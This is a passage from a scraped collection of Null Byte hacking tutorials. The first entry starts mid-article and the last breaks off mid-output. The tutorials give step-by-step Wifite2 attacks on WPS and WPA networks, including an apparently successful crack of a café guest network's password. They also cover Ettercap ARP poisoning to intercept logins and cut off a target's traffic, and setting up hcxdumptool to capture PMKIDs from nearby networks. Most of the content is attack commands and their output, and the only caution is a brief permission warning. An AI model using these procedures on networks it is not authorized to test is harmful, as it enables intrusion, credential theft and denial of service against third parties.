/¯\\ ´  ·  .´  https://github.com/derv82/wifite2\n`     /¯¯¯\\     ´\n[+] option: scanning for targets on channel 11\n[!] conflicting process: NetworkManager (PID 464)\n[!] conflicting process: wpa_supplicant (PID 729)\n[!] conflicting process: dhclient (PID 13595)\n[!] if you have problems: kill -9 PID or re-run wifite with --kill)\n[+] looking for wireless interfaces\nInterface   PHY   Driver              Chipset\n-----------------------------------------------------------------------\n1. wlan0       phy3  ath9k_htc           Atheros Communications, Inc. AR9271 802.11n\n[+] enabling monitor mode on wlan0... enabled wlan0mon\nNUM                      ESSID   CH  ENCR  POWER  WPS?  CLIENT\n---  -------------------------  ---  ----  -----  ----  ------\n1              Suicidegirls    11   WPA   48db    no\n2      Bourgeois Pig Guest     11   WPA   45db    no\n3                     BPnet    11   WPA   42db    no\n4      DirtyLittleBirdyFeet    11   WPA   32db    no    5\n5                ATT73qDwuI    11   WPA   32db   yes\n6               SpanishWiFi    11   WPA   24db    no\n7            Franklin Lower    11   WPA   20db    no    3\n8                     Sonos    11   WPA   11db    no\n9            Villa Carlotta    11   WPA   11db    no\n10                     Sonos    11   WPA   10db    no\n[+] select target(s) (1-10) separated by commas, dashes or all:\nHere, we executed a scan on channel 11 and found 10 different targets. Of those targets, two have clients connected, one has WPS enabled, and all are using WPA security.\nStep 4: Examine the Site Survey & Choose Targets\nFrom our test survey, we can see that target number 5 may present the best target. While the signal strength isn't the best, and there aren't any clients connected, we can probably get a handshake with the new PMKID attack even if no one is connected.\nIf we're looking for weak passwords, the first three networks have the strongest signal strength, while targets 4 and 7 have the best chance of scoring a quick four-way handshake to try brute-forcing later. If we're targeting a particular network, now is when we can select it. If we want to pick the most likely networks, we might select targets 4, 5, and 7 for the likelihood of a fast handshake being captured and cracked, if the WPS PIN isn't cracked first.\n* Don't Miss: Disable Security Cam s on Any Wireless Network with Aireplay-Ng\nIf we want to focus on easy targets, we can tell the script to only display targets vulnerable to a certain kind of attack. To show only targets with WPS that might be vulnerable to Reaver or Bully attacks, we can run Wifite2 with the -wps flag.\nwifite -wps\n.               .\n.´  ·  .     .  ·  `.  wifite 2.1.6\n:  :  :  (¯)  :  :  :  automated wireless auditor\n`.  ·  ` /¯\\ ´  ·  .´  https://github.com/derv82/wifite2\n`     /¯¯¯\\     ´\n[+] option: targeting WPS-encrypted networks\n[!] conflicting process: NetworkManager (PID 464)\n[!] conflicting process: wpa_supplicant (PID 729)\n[!] conflicting process: dhclient (PID 14824)\n[!] if you have problems: kill -9 PID or re-run wifite with --kill)\n[+] looking for wireless interfaces\nInterface   PHY   Driver              Chipset\n-----------------------------------------------------------------------\n1. wlan0       phy4  ath9k_htc           Atheros Communications, Inc. AR9271 802.11n\n[+] enabling monitor mode on wlan0... enabled wlan0mon\nNUM                      ESSID   CH  ENCR  POWER  WPS?  CLIENT\n---  -------------------------  ---  ----  -----  ----  ------\n1                 SBG6580E8     1   WPA   45db   yes\n2          The Daily Planet     1   WPA   30db   yes    1\n3                ATT73qDwuI    11   WPA   28db   yes\n4            birds-Wireless     2   WPA   23db   yes\n[+] select target(s) (1-4) separated by commas, dashes or all:\nWe can do the same with -wpa or -wep to only show targets matching these types of encryption.\nStep 5: Automate Attacks by Target Type\nFrom our results list, let's select a target with both WPS enabled and clients attached. After selecting the number of the network we wish to attack, Wifite2 will proceed through the most expedient attacks against the network.\n[+] (1/1) starting attacks against 69:96:43:69:D6:96 (The Daily Planet)\n[+] The Daily Planet (76db) WPS Pixie-Dust: [--78s] Failed: Timeout after 300 seconds\n[+] The Daily Planet (52db) WPA Handshake capture: Discovered new client: C8:E0:EB:45:CD:45\n[+] The Daily Planet (35db) WPA Handshake capture: Listening. (clients:1, deauth:11s, timeout:7m59s)\n[+] successfully captured handshake\n[+] saving copy of handshake to hs/handshake_TheDailyPlanet_69:96:43:69:D6:96_2018-12-24T00-33-18.cap saved\n[+] analysis of captured handshake file:\n[+]   tshark: .cap file contains a valid handshake for 69:96:43:69:D6:96\n[!]    pyrit: .cap file does not contain a valid handshake\n[+] cowpatty: .cap file contains a valid handshake for (The Daily Planet)\n[+] aircrack: .cap file contains a valid handshake for 69:96:43:69:D6:96\n[+] Cracking WPA Handshake: Using aircrack-ng via common.txt wordlist\n[!] Failed to crack handshake: common.txt did not contain password\n[+] Finished attacking 1 target(s), exiting\nHere, we can see that while the WPS-Pixie attack failed, we were able to easily grab and attack a handshake. The WPS-Pixie attack timed out pretty quickly, so we wasted a minimum of time exploring this avenue of attack. Sometimes, different wireless cards work better with different scripts, and this is true with Reaver and Bully. If one isn't working for you, try the other.\nWifite2 uses Reaver by default, but you can change this to Bully by using the -bully flag.\nwifite -wps -bully\n.               .\n.´  ·  .     .  ·  `.  wifite 2.1.6\n:  :  :  (¯)  :  :  :  automated wireless auditor\n`.  ·  ` /¯\\ ´  ·  .´  https://github.com/derv82/wifite2\n`     /¯¯¯\\     ´\n[+] option: use bully instead of reaver for WPS Attacks\n[+] option: targeting WPS-encrypted networks\n[!] conflicting process: NetworkManager (PID 464)\n[!] conflicting process: wpa_supplicant (PID 729)\n[!] conflicting process: dhclient (PID 14824)\n[!] if you have problems: kill -9 PID or re-run wifite with --kill)\n[+] looking for wireless interfaces\nusing interface wlan0mon (already in monitor mode)\nyou can specify the wireless interface using -i wlan0\nNUM                      ESSID   CH  ENCR  POWER  WPS?  CLIENT\n---  -------------------------  ---  ----  -----  ----  ------\n1                 SBG6580E8     1   WPA   46db   yes\n2          The Daily Planet     1   WPA   34db   yes    1\n[+] select target(s) (1-2) separated by commas, dashes or all: 2\n[+] (1/1) starting attacks against 78:96:84:00:B5:B0 (The Daily Planet)\n[+] The Daily Planet (44db) WPS Pixie-Dust: [4m0s] Failed: More than 100 timeouts\n[+] The Daily Planet (34db) WPA Handshake capture: found existing handshake for The Daily Planet\n[+] Using handshake from hs/handshake_TheDailyPlanet_78-96-84-00-B5-B0_2018-12-24T00-33-18.cap\n[+] analysis of captured handshake file:\n[+]   tshark: .cap file contains a valid handshake for 78:96:84:00:b5:b0\n[!]    pyrit: .cap file does not contain a valid handshake\n[+] cowpatty: .cap file contains a valid handshake for (The Daily Planet)\n[+] aircrack: .cap file contains a valid handshake for 78:96:84:00:B5:B0\n[+] Cracking WPA Handshake: Using aircrack-ng via common.txt wordlist\n[!] Failed to crack handshake: common.txt did not contain password\n[+] Finished attacking 1 target(s), exiting\nWhile we didn't have a better result with Bully, trying both is a good way of figuring out which your wireless network adapter works best with.\nStep 6: Skip & Examine Results\nIf Wifite2 is taking too long on any particular attack, we can always skip the current attack by pressing Ctrl-C to bring up a menu that asks if we'd like to continue. Here, you can skip to the next attack by pressing c, or type s to stop Wifite2.\n[+] SBG6580E8 (47db) WPS Pixie-Dust: [4m52s] Trying PIN 12523146 (DeAuth:Timeout) (Timeouts:15)\n[!] interrupted\n[+] 1 attack(s) remain, do you want to continue?\n[+] type c to continue or s to stop:\nIf we're only able to get a four-way handshake, then we may want to add a custom dictionary list of password guesses to try and crack the handshake. We can do this by setting the --dict flag to set the file containing passwords for cracking, the default being set to /usr/share/wordlists/fern-wifi/common.txt. This password list contains many common passwords, but you'll want to use your own if you're serious about getting results.\nBelow, we successfully decrypt a captured handshake by using a custom dictionary \"passwords.txt.\"\nwifite -wpa --dict ./passwords.txt\n.               .\n.´  ·  .     .  ·  `.  wifite 2.1.6\n:  :  :  (¯)  :  :  :  automated wireless auditor\n`.  ·  ` /¯\\ ´  ·  .´  https://github.com/derv82/wifite2\n`     /¯¯¯\\     ´\n[+] option: using wordlist ./passwords.txt to crack WPA handshakes\n[+] option: targeting WPA-encrypted networks\n[!] conflicting process: NetworkManager (PID 419)\n[!] conflicting process: wpa_supplicant (PID 585)\n[!] conflicting process: dhclient (PID 7902)\n[!] if you have problems: kill -9 PID or re-run wifite with --kill)\n[+] looking for wireless interfaces\nusing interface wlan0mon (already in monitor mode)\nyou can specify the wireless interface using -i wlan0\nNUM                      ESSID   CH  ENCR  POWER  WPS?  CLIENT\n---  -------------------------  ---  ----  -----  ----  ------\n1              Suicidegirls    11   WPA   58db   n/a\n2      Bourgeois Pig Guest     11   WPA   56db   n/a\n3                     BPnet    11   WPA   56db   n/a\n4          The Daily Planet     1   WPA   49db   n/a    1\n5                 SBG6580E8     1   WPA   49db   n/a\n6            Hyla Hair 2.4G     8   WPA   48db   n/a\n7         TWCWiFi-Passpoint     1   WPA   46db   n/a\n8  HP-Print-B9-Officejet...     1   WPA   40db   n/a\n9            birds-Wireless     2   WPA   39db   n/a\n10               SpanishWiFi    11   WPA   38db   n/a\n[!] Airodump exited unexpectedly (Code: 0) Command: airodump-ng wlan0mon -a -w /tmp/wifitei_l5H1/airodump --write-interval 1 --output-format pcap,csv\n[+] select target(s) (1-10) separated by commas, dashes or all: 2\n[+] (1/1) starting attacks against DE:F2:86:EC:CA:A0 (Bourgeois Pig Guest )\n[+] Bourgeois Pig Guest  (57db) WPA Handshake capture: Discovered new client: F0:D5:BF:BD:D5:2B\n[+] Bourgeois Pig Guest  (58db) WPA Handshake capture: Discovered new client: 6C:8D:C1:A8:E4:E9\n[+] Bourgeois Pig Guest  (59db) WPA Handshake capture: Listening. (clients:2, deauth:14s, timeout:8m1s)\n[+] successfully captured handshake\n[+] saving copy of handshake to hs/handshake_BourgeoisPigGuest_DE-F2-86-EC-CA-A0_2018-12-24T01-40-28.cap saved\n[+] analysis of captured handshake file:\n[+]   tshark: .cap file contains a valid handshake for de:f2:86:ec:ca:a0\n[!]    pyrit: .cap file does not contain a valid handshake\n[+] cowpatty: .cap file contains a valid handshake for (Bourgeois Pig Guest )\n[+] aircrack: .cap file contains a valid handshake for DE:F2:86:EC:CA:A0\n[+] Cracking WPA Handshake: Using aircrack-ng via passwords.txt wordlist\n[+] Cracking WPA Handshake: 100.00% ETA: 0s @ 2234.0kps (current key: christmasham)\n[+] Cracked WPA Handshake PSK: christmasham\n[+]   Access Point Name: Bourgeois Pig Guest\n[+]  Access Point BSSID: DE:F2:86:EC:CA:A0\n[+]          Encryption: WPA\n[+]      Handshake File: hs/handshake_BourgeoisPigGuest_DE-F2-86-EC-CA-A0_2018-12-24T01-40-28.cap\n[+]      PSK (password): christmasham\n[+] saved crack result to cracked.txt (1 total)\n[+] Finished attacking 1 target(s), exiting\nBy adding a good password file, we can improve our chances of cracking a Wi-Fi network password even if the faster WPS attacks fail.\nSome Practical Warnings & Defenses\nWifite2 is an example of how even script kiddies can be effective against networks with common vulnerabilities like WPS setup PINs and weak passwords. With an increasing amount of the more advanced attacks becoming automated, it's critical that you learn about the most common and effective ways of attacking a Wi-Fi network.\nIn general, the best way to defend your network from tools like Wifite2 is to make sure you have WPS disabled and pick a very strong password for your Wi-Fi network that you don't share with anyone you don't need to.\nIt's important to note that by selecting \"all\" in a target list, Wifite2 will attack all of the networks it has detected, not just the ones you have permission to attack. You must have permission to use this tool on any network you attack, as attacking a network belonging to someone else without permission is a crime and can get you in a lot of trouble. Saying the script did it isn't an excuse if you're caught attacking an important network, so be sure to keep Wifite2 targeted on networks you have permission to audit.\nI hope you enjoyed this guide to automating Wi-Fi hacking with Wifite2! If you have any questions about this tutorial on Wi-Fi hacking tools or you have a comment, feel free to write it below in the comments or reach me on Twitter @KodyKinzie.",
        "category": "Wifi Hacking"
    },
    {
        "title": "Use Ettercap to Intercept Passwords with ARP Spoofing",
        "link": "https://null-byte.wonderhowto.com/how-to/use-ettercap-intercept-passwords-with-arp-spoofing-0191191/",
        "content": "* WonderHowTo\nARP spoofing is an attack against an Ethernet or Wi-Fi network to get between the router and the target user. In an ARP-spoofing attack, messages meant for the target are sent to the attacker instead, allowing the attacker to spy on, deny service to, or man-in-the-middle a target. One of the most popular tools for performing this attack is Ettercap, which comes preinstalled on Kali Linux.\nOn a regular network, messages are routed over Ethernet or Wi-Fi by associating the MAC address of a connected device with the IP address used to identify it by the router. Usually, this happens via an address resolution protocol (ARP) message indicating which device's MAC address goes with which IP address. It lets the rest of the network know where to send traffic — but it can be easily spoofed to change the way traffic is routed.\n* Don't Miss: Using Netdiscover & ARP to Find Internal IP & MAC Addresses\nIn an ARP-spoofing attack, a program like Ettercap will send spoofed messages attempting to get nearby devices to associate the hacker's MAC address with the IP address of the target. When successful, they're stored temporarily in a configuration setting on other network devices. If the rest of the network starts delivering packets intended for the target to the attacker instead, the attacker effectively controls the target's data connection.\nTypes of ARP Spoofing Attacks\nThere can be three primary outcomes after an attacker gains initial success in poisoning the ARP cache of other hosts on the network:\n* The attacker can spy on traffic. They can lurk in the shadows, seeing everything that the target user does on the network. It's pretty self-explanatory.\n* The attacker can intercept and modify the packets in a man-in-the-middle attack. They can intercept passwords typed into an HTTP website, see DNS requests, and resolve IP addresses the target is navigating to in order to see what sites the target is visiting. In a man-in-the-middle attack, the attacker has the opportunity not only to see what's happening on the network but manipulate it as well. For instance, they can attempt to downgrade the encryption the connection is using by deliberately requesting insecure versions of webpages to make the attacker's job of sniffing passwords easier. Also, a hacker can simply be a nuisance. For example, they can replace words in the text of a website, flip or replace images, or modify other types of data flowing to and from the target.\n* The attacker can drop the packets meant for the target to create a denial-of-service attack. This is possibly the most frustrating to a target. While a Wi-Fi authentication attack is by far the more common cause of a Wi-Fi network being attacked, ARP spoofing can be much more challenging to figure out. If the attacker chooses not to forward on the packets now being sent to it instead of the target, the target will never receive them. The Wi-Fi network can be jammed from the inside, getting between the target and the router and then dropping the packets flowing between.\nEttercap Graphical\nOne of the most intriguing programs installed by default in Kali Linux is Ettercap. Unlike many of the programs that are command-line only, Ettercap features a graphical interface that's very beginner-friendly. While the results may sometimes vary, Ettercap is an excellent tool for newbies to get the hang of network attacks like ARP spoofing. If you don't already have it (like if you downloaded a light version of Kali), you can get it by typing the following into a terminal window.\n~# apt install ettercap-graphical\nReading package lists... Done\nBuilding dependency tree\nReading state information... Done\nettercap-graphical is already the newest version (1:0.8.2-10+b2).\nEttercap isn't the only tool for this, nor is it the most modern. Other tools, such as Bettercap, claim to do what Ettercap does but more effectively. However, Ettercap proves useful enough to feature for our demonstration. The general workflow of an Ettercap ARP spoofing attack is to join a network you want to attack, locate hosts on the network, assign targets to a \"targets\" file, and then execute the attack on the targets.\n* Don't Miss: How to Conduct a Simple Man-in-the-Middle Attack\nOnce we do all of that, we can figuratively watch over the target's shoulder as they browse the internet, and we can even kill the connection from websites we want to steer them away from. We can also run various payloads, like isolating a host from the rest of the network, denying them service by dropping all packets sent to them, or running scripts to attempt to downgrade the security of the connection.\nStep 1: Connect to the Network\nThe first step of ARP spoofing is to connect to the network you want to attack. If you're attacking an encrypted WEP, WPA, or WPA2 network, you'll need to know the password. This is because we're attacking the network internally, so we need to be able to see some information about the other hosts on the network and the data passing within it.\nYou can connect to a network for ARP spoofing in two ways. The first is to connect via Ethernet, which is very effective but may not always be practical and is rarely subtle. Instead, many people prefer to use a wireless network adapter and perform the ARP spoofing over Wi-Fi.\n* Don't Miss: Buy the Best Wireless Network Adapter for Wi-Fi Hacking\nStep 2: Start Ettercap\nIn Kali, click on \"Applications,\" then \"Sniffing & Spoofing,\" followed by \"ettercap-graphical.\" Alternatively, click on the \"Show Applications\" option in the dock, then search for and select \"Ettercap.\"\nOnce it starts up, you should find yourself on the Ettercap main screen. You'll see the spooky Ettercap logo, and a few drop-down menus to start the attack from. In the next step, we'll start exploring the \"Sniff\" menu.\nAt this point, make sure you have an active connection to the network before you continue.\nStep 3: Select Network Interface to Sniff On\nClick on the \"Sniff\" menu item, and then select \"Unified sniffing.\" A new window will open asking you to select which network interface you want to sniff on. You should select the network interface that is currently connected to the network you're attacking.\nNow, you'll see some text confirming that sniffing has started, and you'll be able to access more advanced menu options such as Targets, Hosts, Mitm, Plugins, etc. Before we get started using any of them, we'll need to identify our target on the network.\nStep 4: Identify Hosts on a Network\nTo find the device we want to attack on the network, Ettercap has a few tricks up its sleeve. First, we can do a simple scan for hosts by clicking \"Hosts,\" then \"Scan for hosts.\" A scan will execute, and after it finishes, you can see the resulting hosts Ettercap has identified on the network by clicking \"Hosts,\" then \"Hosts list.\"\nWe can now see a list of targets we've discovered on the network. Want to see what they're doing or narrow down the targets? Click on \"View,\" then \"Connections\" to start snooping on connections.\n* Don't Miss: How to Perform Situational Awareness Attacks\nOnce in the Connections view, you can filter the connections by IP address, type of connection, and whether the connection is open, closed, active, or killed. This gives you a lot of snooping power, which can be augmented by clicking the \"View,\" then \"Resolve IP addresses.\" This means Ettercap will try to resolve the IP addresses it sees other devices on the network connecting to.\nIf you want to identify a target on a network and know what they're browsing, look over their shoulder at what website they're on, and match the website to an IP address with an active connection to the same website. Otherwise, you can usually tell by the MAC address, as you can look it up online to see the manufacturer.\nStep 5: Select Hosts to Target with ARP Spoofing\nNow that we've identified our target's IP address, it's time to add them to a target list. Once we do this, we'll be telling Ettercap that we want to designate that IP address as one we want to pretend to be, so that we're receiving messages from the router that were meant to be sent to the target.\nGo back to the \"Hosts\" screen, and select the IP address of the target you want to target. Click the IP address to highlight it, then click on\"Targets,\" followed by \"Target list,\" to see a list of devices that have been targeted for ARP spoofing.\nNow, we can go to the \"Mitm\" menu to start our attack on this target.\nStep 6: Launch Attack on Targets\nClick on the \"Mitm\" menu, and select \"ARP poisoning.\" A popup will open, and you'll select \"Sniff remote connections\" to begin the sniffing attack.\nOnce this attack has begun, you'll be able to intercept login credentials if the user you're targeting enters them into a website that doesn't use HTTPS. This could be a router or a device on the network or even a website that uses poor security.\nTo try another attack, you can click on \"Plugins,\" then \"Load plugins,\" to show the plugin menu. If you select the DOS attack, it will begin dropping the packets sent to this target, cutting off their internet access.\nStep 7: Try Intercepting a Password\nNow, let's actually try intercepting a password. A website that's great for testing is aavtain.com, which deliberately uses bad security so that you can intercept credentials. On the target device, navigate to aavtrain.com. Once it loads, you'll see a login screen you can enter a fake login and password into.\nEnter a username and password, then hit \"Submit.\" If Ettercap is successful, you should see the login and password you typed appear on the attacker's screen!\nIn this result above, we can see that Ettercap successfully ARP poisoned the target and intercepted an HTTP login request the target was sending to an insecure website.\nARP Poisoning Is a Powerful Tool with Some Limitations\nThe major obvious limitation of ARP spoofing is that it only works if you're connected to a Wi-Fi network. This means it works on open networks but may not work well against networks that have more sophisticated monitoring or firewalls that may detect this sort of behavior.\nARP spoofing attacks are another example of why it's so essential to pick strong passwords for your networks and limit access to those you trust. You're giving away a lot of trust when you give someone your network password or an Ethernet connection, so remember to pick your passwords carefully and who you share them with.\nI hope you enjoyed this guide to using the graphical version of Ettercap for ARP poisoning attacks! If you have any questions about this tutorial on ARP poisoning or you have a comment, do so below, and feel free to reach me on Twitter @KodyKinzie.\nJust updated your iPhone? You'll find new features for Podcasts, News, Books, and TV, as well as important security improvements and fresh wallpapers. Find out what's new and changed on your iPhone with the iOS 17.5 update.\nCover photo and screenshots by Kody/Null Byte",
        "category": "Wifi Hacking"
    },
    {
        "title": "Cracking WPA2 Passwords Using the New PMKID Hashcat Attack",
        "link": "https://null-byte.wonderhowto.com/how-to/hack-wi-fi-cracking-wpa2-passwords-using-new-pmkid-hashcat-attack-0189379/",
        "content": "Step 1: Install Hxctools & Hashcat\nFirst, we'll install the tools we need. To download them, type the following into a terminal window.\n~# git clone https://github.com/ZerBea/hcxdumptool.git\nCloning into 'hcxdumptool'...\nremote: Enumerating objects: 133, done.\nremote: Counting objects: 100% (133/133), done.\nremote: Compressing objects: 100% (97/97), done.\nremote: Total 2127 (delta 82), reused 76 (delta 36), pack-reused 1994\nReceiving objects: 100% (2127/2127), 759.53 KiB | 1.79 MiB/s, done.\nResolving deltas: 100% (1434/1434), done.\nThen, change into the directory and finish the installation with make and then make install.\n~# cd hcxdumptool\n~/hcxdumptool# make\ncc -O3 -Wall -Wextra -std=gnu99  -o hcxpioff hcxpioff.c\ncc -O3 -Wall -Wextra -std=gnu99  -o hcxdumptool hcxdumptool.c  -lcrypto\n~/hcxdumptool# make install\ncc -O3 -Wall -Wextra -std=gnu99  -o hcxpioff hcxpioff.c\ncc -O3 -Wall -Wextra -std=gnu99  -o hcxdumptool hcxdumptool.c  -lcrypto\ninstall -m 0755 -D hcxpioff /usr/local/bin/hcxpioff\ninstall -m 0755 -D hcxdumptool /usr/local/bin/hcxdumptool\nrm -f hcxpioff\nrm -f hcxdumptool\nrm -f *.o *~\nWhen it finishes installing, we'll move onto installing hxctools. To do so, open a new terminal window or leave the /hexdumptool directory, then install hxctools.\n~/hcxdumptool#cd\n~# git clone https://github.com/ZerBea/hcxtools.git\nCloning into 'hcxtools'...\nremote: Enumerating objects: 120, done.\nremote: Counting objects: 100% (120/120), done.\nremote: Compressing objects: 100% (82/82), done.\nremote: Total 6196 (delta 77), reused 79 (delta 38), pack-reused 6076\nReceiving objects: 100% (6196/6196), 1.89 MiB | 5.02 MiB/s, done.\nResolving deltas: 100% (4320/4320), done.\nNext, change into its directory and run make and make install like before. If you get an error, try typing sudo before the command.\n~# cd hcxtools\n~/hcxtools# make\nmkdir -p .deps\ncc -O3 -Wall -Wextra -std=gnu99  -MMD -MF .deps/hcxpcapngtool.d -o hcxpcapngtool hcxpcapngtool.c -lz -lcrypto\ncc -O3 -Wall -Wextra -std=gnu99  -MMD -MF .deps/hcxhashtool.d -o hcxhashtool hcxhashtool.c -lcrypto -lcurl\ncc -O3 -Wall -Wextra -std=gnu99  -MMD -MF .deps/hcxpsktool.d -o hcxpsktool hcxpsktool.c -lcrypto\ncc -O3 -Wall -Wextra -std=gnu99  -MMD -MF .deps/hcxwltool.d -o hcxwltool hcxwltool.c\ncc -O3 -Wall -Wextra -std=gnu99  -MMD -MF .deps/wlancap2wpasec.d -o wlancap2wpasec wlancap2wpasec.c -lcurl\ncc -O3 -Wall -Wextra -std=gnu99  -MMD -MF .deps/whoismac.d -o whoismac whoismac.c -lcurl\ncc -O3 -Wall -Wextra -std=gnu99  -MMD -MF .deps/hcxpmkidtool.d -o hcxpmkidtool hcxpmkidtool.c -lcrypto -lpthread\ncc -O3 -Wall -Wextra -std=gnu99  -MMD -MF .deps/wlanhcx2john.d -o wlanhcx2john wlanhcx2john.c\ncc -O3 -Wall -Wextra -std=gnu99  -MMD -MF .deps/hcxpcaptool.d -o hcxpcaptool hcxpcaptool.c -lz -lcrypto\ncc -O3 -Wall -Wextra -std=gnu99  -MMD -MF .deps/hcxhashcattool.d -o hcxhashcattool hcxhashcattool.c -lcrypto -lpthread\ncc -O3 -Wall -Wextra -std=gnu99  -MMD -MF .deps/hcxmactool.d -o hcxmactool hcxmactool.c\ncc -O3 -Wall -Wextra -std=gnu99  -MMD -MF .deps/hcxessidtool.d -o hcxessidtool hcxessidtool.c\ncc -O3 -Wall -Wextra -std=gnu99  -MMD -MF .deps/hcxhash2cap.d -o hcxhash2cap hcxhash2cap.c\ncc -O3 -Wall -Wextra -std=gnu99  -MMD -MF .deps/wlanhc2hcx.d -o wlanhc2hcx wlanhc2hcx.c\ncc -O3 -Wall -Wextra -std=gnu99  -MMD -MF .deps/wlanwkp2hcx.d -o wlanwkp2hcx wlanwkp2hcx.c\ncc -O3 -Wall -Wextra -std=gnu99  -MMD -MF .deps/wlanhcxinfo.d -o wlanhcxinfo wlanhcxinfo.c\ncc -O3 -Wall -Wextra -std=gnu99  -MMD -MF .deps/wlanhcx2ssid.d -o wlanhcx2ssid wlanhcx2ssid.c\ncc -O3 -Wall -Wextra -std=gnu99  -MMD -MF .deps/wlanhcxcat.d -o wlanhcxcat wlanhcxcat.c -lcrypto\ncc -O3 -Wall -Wextra -std=gnu99  -MMD -MF .deps/wlanpmk2hcx.d -o wlanpmk2hcx wlanpmk2hcx.c -lcrypto\ncc -O3 -Wall -Wextra -std=gnu99  -MMD -MF .deps/wlanjohn2hcx.d -o wlanjohn2hcx wlanjohn2hcx.c\ncc -O3 -Wall -Wextra -std=gnu99  -MMD -MF .deps/wlancow2hcxpmk.d -o wlancow2hcxpmk wlancow2hcxpmk.c\n~/hcxtools# make install\ninstall -m 0755 -D hcxpcapngtool /usr/local/bin/hcxpcapngtool\ninstall -m 0755 -D hcxhashtool /usr/local/bin/hcxhashtool\ninstall -m 0755 -D hcxpsktool /usr/local/bin/hcxpsktool\ninstall -m 0755 -D hcxwltool /usr/local/bin/hcxwltool\ninstall -m 0755 -D wlancap2wpasec /usr/local/bin/wlancap2wpasec\ninstall -m 0755 -D whoismac /usr/local/bin/whoismac\ninstall -m 0755 -D hcxpmkidtool /usr/local/bin/hcxpmkidtool\ninstall -m 0755 -D wlanhcx2john /usr/local/bin/wlanhcx2john\ninstall -m 0755 -D hcxpcaptool /usr/local/bin/hcxpcaptool\ninstall -m 0755 -D hcxhashcattool /usr/local/bin/hcxhashcattool\ninstall -m 0755 -D hcxmactool /usr/local/bin/hcxmactool\ninstall -m 0755 -D hcxessidtool /usr/local/bin/hcxessidtool\ninstall -m 0755 -D hcxhash2cap /usr/local/bin/hcxhash2cap\ninstall -m 0755 -D wlanhc2hcx /usr/local/bin/wlanhc2hcx\ninstall -m 0755 -D wlanwkp2hcx /usr/local/bin/wlanwkp2hcx\ninstall -m 0755 -D wlanhcxinfo /usr/local/bin/wlanhcxinfo\ninstall -m 0755 -D wlanhcx2ssid /usr/local/bin/wlanhcx2ssid\ninstall -m 0755 -D wlanhcxcat /usr/local/bin/wlanhcxcat\ninstall -m 0755 -D wlanpmk2hcx /usr/local/bin/wlanpmk2hcx\ninstall -m 0755 -D wlanjohn2hcx /usr/local/bin/wlanjohn2hcx\ninstall -m 0755 -D wlancow2hcxpmk /usr/local/bin/wlancow2hcxpmk\nFinally, we'll need to install Hashcat, which should be easy, as it's included in the Kali Linux repo by default. Simply type the following to install the latest version of Hashcat.\n~/hcxtools# cd\n~# apt install hashcat\nReading package lists... Done\nBuilding dependency tree\nReading state information... Done\nhashcat is already the newest version (5.1.0+ds1-1).\nThe following packages were automatically installed and are no longer required:\nlibdouble-conversion1 liblinear3\nUse 'apt autoremove' to remove them.\n0 upgraded, 0 newly installed, 0 to remove and 1863 not upgraded.\nWith this complete, we can move on to setting up the wireless network adapter.\nStep 2: Prepare the Wireless Network Adapter\nAfter plugging in your Kali-compatible wireless network adapter, you can find the name by typing ifconfig or ip a. Typically, it will be named something like wlan0. The first step will be to put the card into wireless monitor mode, allowing us to listen in on Wi-Fi traffic in the immediate area.\nTo do this, type the following command into a terminal window, substituting the name of your wireless network adapter for wlan0.\n~# airmon-ng start wlan0\nFound 3 processes that could cause trouble\nKill them using 'airmon-ng check kill' before putting\nthe card in monitor mode, they will interfere by changing channels\nand sometimes putting the interface back in managed mode\n555 NetworkManager\n611 wpa_supplicant\n6636 dhclient\nPHY     Interface   Driver      Chipset\nphy0    wlan0       ath9k       Qualcomm Atheros QCA9565 / AR9565 Wireless Network Adapter (rev 01)\n(mac80211 monitor mode vif enabled for [phy0]wlan0 on [phy0]wlan0mon)\n(mac80211 station mode vif disabled for [phy0]wlan0)\nphy1    wlan1       ath9k_htc   Atheros Communications, Inc. AR9271 802.11n\nNow, your wireless network adapter should have a name like \"wlan0mon\" and be in monitor mode. You can confirm this by running ifconfig again.\nStep 3: Use Hxcdump to Capture PMKIDs from Local Networks\nNow we are ready to capture the PMKIDs of devices we want to try attacking. With our wireless network adapter in monitor mode as \"wlan1mon,\" we'll execute the following command to begin the attack.\n~# hcxdumptool -i wlan1mon -o galleria.pcapng --enable__status=1\nBreaking this down, -i tells the program which interface we are using, in this case, wlan1mon. The filename we'll be saving the results to can be specified with the -o flag argument. The channel we want to scan on can be indicated with the -c flag followed by the number of the channel to scan.\nIn our command above, we're using wlan1mon to save captured PMKIDs to a file called \"galleria.pcapng.\" While you can specify another status value, I haven't had success capturing with any value except 1.\nwarning: NetworkManager is running with pid 555\nwarning: wpa_supplicant is running with pid 611\nwarning: wlan1mon is probably a monitor interface\nstart capturing (stop with ctrl+c)\nINTERFACE:...............: wlan1mon\nFILTERLIST...............: 0 entries\nMAC CLIENT...............: fcc233ca8bc5\nMAC ACCESS POINT.........: 10ae604b9e82 (incremented on every new client)\nEAPOL TIMEOUT............: 150000\nREPLAYCOUNT..............: 62439\nANONCE...................: d8dd2206c82ad030e843a39e8f99281e215492dbef56f693cd882d4dfcde9956\n[22:17:32 - 001] c8b5adb615ea -> fcc233ca8bc5 [FOUND PMKID CLIENT-LESS]\n[22:17:32 - 001] c8b5adb615e9 -> fcc233ca8bc5 [FOUND PMKID CLIENT-LESS]\n[22:17:33 - 001] 2c95694f3ca0 -> fcc233ca8bc5 [FOUND PMKID CLIENT-LESS]\n[22:17:33 - 001] 2c95694f3ca0 -> b4b686abc81a [FOUND PMKID]\n[22:17:48 - 011] 14edbb9938ea -> fcc233ca8bc5 [FOUND PMKID CLIENT-LESS]\n[22:17:48 - 011] 88964e3a8ea0 -> fcc233ca8bc5 [FOUND PMKID CLIENT-LESS]\n[22:17:49 - 011] dc7fa425888a -> fcc233ca8bc5 [FOUND PMKID CLIENT-LESS]\n[22:17:51 - 011] 88964e801fa0 -> fcc233ca8bc5 [FOUND PMKID CLIENT-LESS]\n[22:17:57 - 001] 9822efc6fdff -> ba634d3eb80d [EAPOL 4/4 - M4 RETRY ATTACK]\n[22:17:57 - 001] 9822efc6fdff -> ba634d3eb80d [FOUND HANDSHAKE AP-LESS, EAPOL TIMEOUT 6696]\n[22:18:04 - 011] 803773defd01 -> fcc233ca8bc5 [FOUND PMKID CLIENT-LESS]\n[22:19:21 - 011] 14edbb9ba0e6 -> 803773defd01 [FOUND AUTHORIZED HANDSHAKE, EAPOL TIMEOUT 15247]\n[22:19:34 - 006] 0618d629465b -> 58fb8433aac2 [FOUND AUTHORIZED HANDSHAKE, EAPOL TIMEOUT 2832]\n[22:19:42 - 005] e0220203294e -> fcc233ca8bc5 [FOUND PMKID CLIENT-LESS]\n[22:19:57 - 011] 14edbb9ba0e6 -> 